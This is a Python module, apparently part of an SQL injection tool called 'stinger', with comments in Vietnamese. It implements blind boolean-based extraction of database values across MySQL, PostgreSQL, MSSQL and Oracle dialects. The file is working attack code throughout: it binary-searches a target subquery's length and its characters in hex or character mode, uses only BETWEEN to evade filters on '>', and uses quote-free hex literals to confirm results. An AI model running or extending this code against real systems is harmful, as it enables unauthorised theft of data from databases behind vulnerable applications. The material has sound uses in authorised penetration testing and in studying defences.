#!/usr/bin/env python3
"""
Extract - trích xuất giá trị chuỗi qua oracle true/false, tổng quát theo dialect.

Bung logic từ draft/ (bsearch chỉ dùng BETWEEN, get_number, chế độ hex/char) nhưng
KHÔNG hardcode cú pháp MySQL. Các mảnh cú pháp (substr/ascii/length/hex/hexlit) lấy từ
`dialect` của DBMS đã chốt -> chạy được cho MySQL/PGSQL/MSSQL/Oracle.

Chế độ:
  - hex : đọc hex(value), charset [0-9A-F], binary search bằng BETWEEN. An toàn nhất,
          bắt được byte >127 (multibyte). ~5 request/hex-digit.
  - char: đọc trực tiếp từng ký tự, khoảng 0..255. ~8 request/ký tự.

(Chế độ turbo của draft phụ thuộc độ-dài-sleep, để sau - cần transport thật để hiệu chuẩn.)
"""

from __future__ import annotations

from typing import Optional

from stinger.oracle import Oracle


class ExtractError(Exception):
    pass


class Dialect:
    """Bọc dict dialect, cung cấp các hàm lắp ráp biểu thức SQL."""

    def __init__(self, d: dict):
        self.d = d

    def _need(self, key: str) -> str:
        if key not in self.d:
            raise ExtractError("dialect thiếu mảnh '%s'" % key)
        return self.d[key]

    def substr(self, src: str, i: int) -> str:
        return self._need("substr").format(s=src, i=i)

    def ascii(self, char_expr: str) -> str:
        return self._need("ascii").format(c=char_expr)

    def length(self, src: str) -> str:
        return self._need("length").format(s=src)

    def charlen(self, src: str) -> str:
        return self.d.get("charlen", self._need("length")).format(s=src)

    def hex(self, src: str) -> str:
        return self._need("hex").format(s=src)

    def hexlit(self, h: str) -> str:
        return self._need("hexlit").format(h=h)

    def notnull(self, src: str) -> str:
        return self.d.get("notnull", "(({s}) is not null)").format(s=src)

    # biểu thức "mã ký tự thứ i của src"
    def char_code_at(self, src: str, i: int) -> str:
        return self.ascii(self.substr(src, i))


# --------------------------------------------------------------------------- search
def bsearch(oracle: Oracle, expr: str, lo: int, hi: int) -> int:
    """Tìm giá trị của <expr> trong [lo,hi] CHỈ bằng BETWEEN (né filter '>')."""
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle.ask("%s between %d and %d" % (expr, lo, mid)):
            hi = mid
        else:
            lo = mid + 1
    return lo


def get_number(oracle: Oracle, expr: str, hi: int = 4096) -> int:
    """Đọc một số nguyên, tự nới rộng khoảng trên nếu cần."""
    while not oracle.ask("%s between 0 and %d" % (expr, hi)):
        hi *= 2
        if hi > 2 ** 24:
            raise ExtractError("%s vượt quá 2^24 - có lẽ subquery trả NULL" % expr)
    return bsearch(oracle, expr, 0, hi)


# --------------------------------------------------------------------------- extract
def extract(oracle: Oracle,
            query: str,
            dialect: dict,
            mode: str = "hex",
            maxlen: Optional[int] = None,
            progress=None,
            log=None) -> tuple[bytes, dict]:
    """Trích xuất giá trị của <query>. Trả về (raw_bytes, meta).

    progress(done, total, preview) - callback tùy chọn để hiện tiến độ.
    log(msg)                        - callback tùy chọn in các bước chính.
    """
    dia = Dialect(dialect)
    meta = {}

    def _progress(done, total, preview):
        if progress:
            progress(done, total, preview)

    def _log(msg):
        if log:
            log(msg)

    # 1) subquery có dữ liệu không? NULL làm mọi điều kiện thành false âm thầm.
    _log("[extract] bước 1: kiểm tra subquery có dữ liệu (IS NOT NULL)...")
    if not oracle.ask(dia.notnull(query)):
        raise ExtractError(
            "subquery trả NULL hoặc không có row. Kiểm tra tên bảng/cột và quyền."
        )

    # 2) độ dài byte và ký tự -> phát hiện multibyte
    _log("[extract] bước 2: đo độ dài bằng binary search (length / char_length)...")
    blen = get_number(oracle, dia.length(query))
    clen = get_number(oracle, dia.charlen(query))
    meta["byte_len"] = blen
    meta["char_len"] = clen
    multibyte = "  <-- KHÁC NHAU: có ký tự multibyte" if blen != clen else ""
    _log("[extract]   length()      = %d byte" % blen)
    _log("[extract]   char_length() = %d ký tự%s" % (clen, multibyte))

    if mode == "hex":
        _log("[extract] bước 3: đọc hex(value) - %d hex-digit, mỗi digit ~5 request "
             "(binary search trên [0-9A-F])..." % (blen * 2))
        src = dia.hex(query)
        n = blen * 2
        if maxlen:
            n = min(n, maxlen * 2)
        digits = ""
        for i in range(1, n + 1):
            expr = dia.char_code_at(src, i)
            # '0'-'9'=48-57, 'A'-'F'=65-70
            if oracle.ask("%s between 48 and 57" % expr):
                code = bsearch(oracle, expr, 48, 57)
            else:
                code = bsearch(oracle, expr, 65, 70)
            digits += chr(code)
            if i % 2 == 0:
                preview = bytes.fromhex(digits).decode("utf-8", "replace")
                _progress(i // 2, blen, preview)
        return bytes.fromhex(digits), meta

    if mode == "char":
        _log("[extract] bước 3: đọc trực tiếp từng ký tự - %s ký tự, mỗi ký tự ~8 request "
             "(binary search trên [0-255])..." % (maxlen or clen))
        n = maxlen or clen
        out = bytearray()
        for i in range(1, n + 1):
            expr = dia.char_code_at(query, i)
            code = bsearch(oracle, expr, 0, 255)
            if code == 0:
                break
            out.append(code)
            _progress(i, n, out.decode("utf-8", "replace"))
        return bytes(out), meta

    raise ExtractError("mode không hỗ trợ: %s (dùng 'hex' hoặc 'char')" % mode)


def verify(oracle: Oracle, query: str, dialect: dict, data: bytes) -> bool:
    """Xác minh toàn bộ giá trị bằng 1 request, dùng hex literal (không cần nháy)."""
    dia = Dialect(dialect)
    lit = dia.hexlit(data.hex())
    return oracle.ask("(%s) between %s and %s" % (query, lit, lit))
